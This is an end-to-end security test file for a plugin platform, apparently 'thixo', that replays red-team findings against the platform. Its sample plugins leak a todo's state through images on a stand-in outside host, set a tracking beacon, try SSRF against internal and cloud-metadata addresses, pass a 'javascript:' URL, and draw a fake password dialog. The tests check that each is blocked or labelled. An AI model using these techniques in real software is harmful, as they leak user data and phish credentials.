// What the red team found, driven the way an attacker would: `thixo dev` on a disposable copy of examples/todo, an
// outside listener on another port, plugins submitted through `thixo agent`, and headless Chromium as each user.
// Run it with `npm run e2e` after `npm run build`.
//
// The copy's config gives `local()` a fetcher for copy at build that stands in for the internet: an address on
// https://outside.test/ is fetched from the outside listener, and every other address goes to the real guarded
// fetcher, which refuses anything inside the network. So a build fetch shows up as a hit on the listener too.

import assert from "node:assert/strict";
import { createServer } from "node:http";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, before, test } from "node:test";
import { chromium } from "playwright";
import { spawn } from "node:child_process";
import { THIXO, copyExample, removeCopy, startDev, thixo } from "./support.mjs";

let dir;
let dev;
let browser;
let outside;
let outsideUrl;
const hits = [];
const folders = [];

before(async () => {
  outside = createServer((request, response) => {
    hits.push(`${request.method} ${request.url}`);
    response.writeHead(200, { "content-type": "image/gif", "access-control-allow-origin": "*" });
    response.end(Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"));
  });
  await new Promise((ok) => outside.listen(0, "127.0.0.1", ok));
  outsideUrl = `http://127.0.0.1:${outside.address().port}`;
  dir = copyExample("todo");
  const config = join(dir, "thixo.config.ts");
  const fetcher = `local({
    // e2e: copy at build, with https://outside.test/ standing in for the internet (the test's outside listener).
    fetchAsset: async (address, limits) => {
      if (!address.startsWith("https://outside.test/")) return guardedFetch()(address, limits);
      const response = await fetch(address.replace("https://outside.test", ${JSON.stringify(outsideUrl)}));
      return { ok: true, bytes: new Uint8Array(await response.arrayBuffer()), contentType: response.headers.get("content-type") ?? "" };
    },
  })`;
  const text = readFileSync(config, "utf8");
  assert.ok(text.includes("adapters: local(),"), "the todo example's config uses local()");
  writeFileSync(config, text.replace("adapters: local(),", `adapters: ${fetcher},`).replace(`import { local, claudeCode } from "thixo-node";`, `import { local, claudeCode, guardedFetch } from "thixo-node";`));
  dev = await startDev(dir);
  browser = await chromium.launch();
});

after(async () => {
  await browser?.close();
  await dev?.stop();
  removeCopy(dir);
  for (const folder of folders) rmSync(folder, { recursive: true, force: true });
  await new Promise((ok) => (outside ? outside.close(ok) : ok()));
});

function pluginFolder(files) {
  const folder = mkdtempSync(join(tmpdir(), "thixo-plugin-"));
  for (const [name, text] of Object.entries(files)) writeFileSync(join(folder, name), text);
  folders.push(folder);
  return folder;
}

function agent(args) {
  const result = thixo(["agent", ...args, "--project", dir]);
  assert.equal(result.code, 0, `thixo agent ${args.join(" ")}\n${result.stdout}\n${result.stderr}`);
  return JSON.parse(result.stdout);
}

/** Submits a folder as `user` and puts it in their todo-detail slot. */
function submitAndUse(user, folder) {
  const submitted = agent(["submit", "--as", user, "--dir", folder, "--raw"]);
  assert.equal(submitted.ok, true, JSON.stringify(submitted));
  const id = submitted.plugin.id ?? submitted.plugin;
  agent(["use", "--as", user, `${id}@${submitted.version}`, "--slot", "todo-detail", "--raw"]);
  return { id, version: submitted.version };
}

async function as(user, options = {}) {
  const context = await browser.newContext(options);
  await context.addCookies([{ name: "thixo-user", value: user, url: dev.url }]);
  const page = await context.newPage();
  await page.goto(dev.url);
  await page.getByRole("region", { name: "Todo list (main)" }).waitFor();
  return page;
}

async function openTodo(page, title) {
  await page.getByRole("region", { name: "Todo list (main)" }).getByRole("button", { name: title, exact: true }).click();
  await page.getByRole("region", { name: "Selected todo" }).waitFor();
}

/** `thixo agent ...` without blocking this process, which runs the outside listener the server's build fetches
 * from: a synchronous spawn would leave the listener unable to answer. */
function agentAsync(args) {
  return new Promise((ok) => {
    const child = spawn(process.execPath, [THIXO, "agent", ...args, "--project", dir], { env: { ...process.env, NO_COLOR: "1" } });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (c) => (stdout += c));
    child.stderr.on("data", (c) => (stderr += c));
    child.on("exit", (code) => ok({ code, stdout, stderr, text: `${stdout}\n${stderr}` }));
  });
}

/** Submits a folder as `user` and returns the agent's reply and exit code, without failing on a refusal. */
function trySubmit(user, folder) {
  return agentAsync(["submit", "--as", user, "--dir", folder, "--raw"]);
}

async function quiet(page) {
  await page.waitForLoadState("networkidle");
  await new Promise((ok) => setTimeout(ok, 300));
}

const pictureData = `import { annotate } from "thixo/data";\nimport { t } from "thixo/schema";\nimport { Todo } from "@app/sdk";\n\nexport const pic = annotate(Todo, { link: t.url() });\n`;

test("an outside image written in a plugin's source is copied at build, and the page never asks the outside host for it, even with no CSP (L4, L7)", async () => {
  // redteam-exfil rounds 1 and 2: a plugin chose which of several images on its author's host to show, by what it
  // read, and each load told the host a bit. Now the build fetches each written-out image once, and the page loads
  // the app's copy, so the author's host sees the build and never a viewer.
  hits.length = 0;
  const submitted = await trySubmit(
    "ana",
    pluginFolder({
      "plugin.thx": `import { definePlugin, useQuery } from "thixo/plugin";
import { todoDetail } from "@app/slots";
import { getTodo } from "@app/sdk";

export default definePlugin(todoDetail, { name: "Signal", description: "Shows a picture chosen by the todo." }, function Signal({ context }) {
  const q = useQuery(getTodo, { id: context.todoId });
  if (!q.data) return null;
  return q.data.done ? <img src="https://outside.test/bit1.gif" alt="the picture" /> : <img src="https://outside.test/bit0.gif" alt="the picture" />;
});
`,
    }),
  );
  assert.equal(submitted.code, 0, submitted.text);
  const reply = JSON.parse(submitted.stdout);
  const logo = { id: reply.plugin.id ?? reply.plugin, version: reply.version };
  agent(["use", "--as", "ana", `${logo.id}@${logo.version}`, "--slot", "todo-detail", "--raw"]);
  assert.ok(reply.summary.includes("Copied 2 files from outside.test when it was built: they load from this app, never from outside.test"), JSON.stringify(reply.summary));
  assert.deepEqual(hits.sort(), ["GET /bit0.gif", "GET /bit1.gif"], "the build fetched each written-out image once, from the server");
  hits.length = 0;

  const page = await as("ana", { bypassCSP: true });
  // Control: with the CSP bypassed, the page itself can reach the listener, so silence below means the language.
  await page.evaluate((u) => new Promise((ok) => Object.assign(new Image(), { onload: ok, onerror: ok, src: `${u}/control` })), outsideUrl);
  assert.deepEqual(hits, ["GET /control"]);
  hits.length = 0;

  await openTodo(page, "Write the quarterly report");
  const img = page.getByRole("region", { name: "Signal (todo-detail)" }).getByRole("img", { name: "the picture" });
  await img.waitFor();
  const src = await img.getAttribute("src");
  assert.match(src, new RegExp(`^/_thixo/plugins/${logo.id}/${logo.version}/assets/[0-9a-f]{64}\\.gif\\?u=ana&`), "the image is the app's copy");
  await page.waitForFunction(() => [...document.querySelectorAll("img")].some((i) => i.alt === "the picture" && i.complete && i.naturalWidth > 0));
  await quiet(page);
  assert.deepEqual(hits, [], "nothing arrived at the outside listener from the page");

  // Opened on its own, outside the page, the copy is served under the plugin code's rule.
  const anonymous = await page.evaluate(async (path) => (await fetch(path.split("?")[0], { credentials: "omit" })).status, src);
  assert.equal(anonymous, 401, "without the ticket or a token the copy is not served");
  await page.context().close();
});

test("a written-out image inside the network is refused at build, and nothing reaches it", async () => {
  hits.length = 0;
  const port = new URL(outsideUrl).port;
  for (const [address, message] of [
    ["https://127.0.0.1/x.gif", /127\.0\.0\.1 is not an address on the public internet/],
    ["https://localhost/x.gif", /localhost is not a public host/],
    ["https://169.254.169.254/latest/meta-data/", /169\.254\.169\.254 is not an address on the public internet/],
    [`https://127.0.0.1:${port}/x.gif`, new RegExp(`port ${port}`)],
  ]) {
    const refused = await trySubmit(
      "ana",
      pluginFolder({
        "plugin.thx": `import { definePlugin } from "thixo/plugin";
import { todoDetail } from "@app/slots";

export default definePlugin(todoDetail, { name: "Inside", description: "Tries to reach inside." }, function Inside() {
  return <img src="${address}" alt="x" />;
});
`,
      }),
    );
    assert.equal(refused.code, 1, refused.text);
    assert.match(refused.text, /build\/copy-failed/);
    assert.match(refused.text, message);
  }
  assert.deepEqual(hits, [], "the build did not reach the listener");
});

test("a Url handed in from data loads whatever its host: the risk that remains is a saved Url as a tracking pixel (L7)", async () => {
  // redteam-language round 2 seeded a url field with an outside address and rendered it as <img src>. The owner
  // accepts that: the plugin did not make the address. Whoever opens the page tells that host they did.
  const picture = submitAndUse(
    "ana",
    pluginFolder({
      "data.thx": pictureData,
      "plugin.thx": `import { definePlugin, useAnnotation } from "thixo/plugin";
import { todoDetail } from "@app/slots";
import { pic } from "./data";

export default definePlugin(todoDetail, { name: "Picture", description: "Shows a picture for a todo." }, function Picture({ context }) {
  const [fields] = useAnnotation(pic, context.todoId);
  if (!fields || !fields.link) return <p>No picture yet</p>;
  return <div><img src={fields.link} alt="the picture" /><a href={fields.link}>open it</a></div>;
});
`,
    }),
  );

  // The listener is http on 127.0.0.1, which the page's CSP (img-src https:) would block; bypass it to see the
  // language's own rule.
  const page = await as("ana", { bypassCSP: true });
  const seeded = await page.evaluate(
    async ({ plugin, version, beacon }) => {
      const { token } = await (await fetch("/_thixo/token", { method: "POST" })).json();
      const todos = await (await fetch("/api/todos", { headers: { authorization: `Bearer ${token}` } })).json();
      const todo = todos.find((t) => t.title === "Write the quarterly report");
      const response = await fetch("/_thixo/data/patch", {
        method: "POST",
        headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
        body: JSON.stringify({ plugin, version, at: { record: "todo", id: todo.id }, fields: { link: { $url: beacon } } }),
      });
      return response.status;
    },
    { plugin: picture.id, version: picture.version, beacon: `${outsideUrl}/beacon?seen=1` },
  );
  assert.equal(seeded, 204, "the server takes an http address for a url field");
  hits.length = 0;

  await openTodo(page, "Write the quarterly report");
  const region = page.getByRole("region", { name: "Picture (todo-detail)" });
  await region.getByRole("img", { name: "the picture" }).waitFor();
  assert.equal(await region.getByRole("img", { name: "the picture" }).getAttribute("src"), `${outsideUrl}/beacon?seen=1`);
  assert.equal(await region.getByRole("link", { name: "open it" }).getAttribute("href"), `${outsideUrl}/beacon?seen=1`);
  assert.equal(await page.getByRole("alert").count(), 0, "the plugin kept running");
  await quiet(page);
  assert.deepEqual(hits, ["GET /beacon?seen=1"], "the handed-in Url loaded from its own host");

  // A plugin still can't put a script address in the field: the server refuses it as data.
  const refused = await page.evaluate(
    async ({ plugin, version }) => {
      const { token } = await (await fetch("/_thixo/token", { method: "POST" })).json();
      const todos = await (await fetch("/api/todos", { headers: { authorization: `Bearer ${token}` } })).json();
      const response = await fetch("/_thixo/data/patch", {
        method: "POST",
        headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
        body: JSON.stringify({ plugin, version, at: { record: "todo", id: todos[0].id }, fields: { link: { $url: "javascript:alert(1)" } } }),
      });
      return response.status;
    },
    { plugin: picture.id, version: picture.version },
  );
  assert.equal(refused, 400, "javascript: is not an address");
  await page.context().close();
});

test("a plugin's dialog always says which plugin drew it, outside the plugin's reach (S8, P8)", async () => {
  // redteam-social round 2: openModal drew shell chrome titled "Session expired" with no word of which plugin it was.
  const reminder = agent([
    "submit",
    "--as",
    "ana",
    "--raw",
    "--dir",
    pluginFolder({
      "plugin.thx": `import { definePlugin } from "thixo/plugin";
import { openModal } from "thixo/services";
import { todoDetail } from "@app/slots";

export default definePlugin(todoDetail, { name: "Reminder", description: "A small reminder widget." }, function Reminder() {
  function show() {
    openModal(<div><label>Password<input type="text" /></label><button>Sign in</button></div>, { title: "Session expired" });
  }
  return <button onClick={show}>Remind me later</button>;
});
`,
    }),
  ]);
  assert.equal(reminder.ok, true, JSON.stringify(reminder));
  const id = reminder.plugin.id ?? reminder.plugin;
  const ana = await as("ana");
  await ana.getByRole("button", { name: "Plugins" }).click();
  const item = ana.getByRole("region", { name: "Plugin browser" }).getByRole("listitem", { name: "Reminder" });
  await item.getByRole("button", { name: "Share Reminder" }).click();
  await item.getByText("shared · by ana").waitFor();
  await ana.context().close();

  const ben = await as("ben");
  agent(["use", "--as", "ben", `${id}@1`, "--slot", "todo-detail", "--raw"]);
  await ben.reload();
  await openTodo(ben, "Review the pull request");
  await ben.getByRole("region", { name: "Reminder (todo-detail)" }).getByRole("button", { name: "Remind me later" }).click();
  const dialog = ben.getByRole("dialog");
  await dialog.waitFor();
  const name = await dialog.evaluate((el) => el.getAttribute("aria-labelledby").split(" ").map((i) => document.getElementById(i).textContent).join(" "));
  assert.equal(name, "Session expired From the plugin “Reminder”, by ana");
  const source = dialog.getByText("From the plugin “Reminder”, by ana");
  assert.equal(await source.isVisible(), true);
  assert.equal(await source.evaluate((el) => el.closest(".thixo-slot-box") === null), true, "the line is the shell's, not inside the plugin's box");
  await ben.context().close();
});

test("a plugin can't be shared under a default plugin's name, and the registry marks the default (G5)", async () => {
  // redteam-social round 2: a shared "Due dates" with the default's description sat beside the real one.
  const spoof = agent([
    "submit",
    "--as",
    "ana",
    "--raw",
    "--dir",
    pluginFolder({
      "plugin.thx": `import { definePlugin } from "thixo/plugin";
import { todoDetail } from "@app/slots";

export default definePlugin(todoDetail, { name: "Due dates", description: "Give a todo a due date and see a warning when it is close." }, function Spoof() {
  return <p>Not the real one</p>;
});
`,
    }),
  ]);
  assert.equal(spoof.ok, true, JSON.stringify(spoof));

  const ana = await as("ana");
  await ana.getByRole("button", { name: "Plugins" }).click();
  const browserRegion = ana.getByRole("region", { name: "Plugin browser" });
  const search = browserRegion.getByRole("search", { name: "Search plugins" });
  await search.getByRole("textbox", { name: "Search plugins" }).fill("Due dates");
  await search.getByRole("button", { name: "Search" }).click();
  const mine = browserRegion.getByRole("listitem", { name: "Due dates" }).filter({ hasText: "personal · by ana" });
  await mine.waitFor();
  await mine.getByRole("button", { name: "Share Due dates" }).click();
  const refused = browserRegion.getByRole("alert").filter({ hasText: "Share failed" });
  await refused.waitFor();
  assert.match(await refused.innerText(), /already the name of a default plugin of this app/);
  await ana.context().close();

  const ben = await as("ben");
  await ben.getByRole("button", { name: "Plugins" }).click();
  const benRegion = ben.getByRole("region", { name: "Plugin browser" });
  await benRegion.getByRole("search", { name: "Search plugins" }).getByRole("textbox", { name: "Search plugins" }).fill("Due dates");
  await benRegion.getByRole("search", { name: "Search plugins" }).getByRole("button", { name: "Search" }).click();
  const found = benRegion.getByRole("listitem", { name: "Due dates" });
  await found.first().waitFor();
  assert.equal(await found.count(), 1, "ben sees only the default");
  await found.getByText("Default", { exact: true }).waitFor();
  await ben.context().close();
});
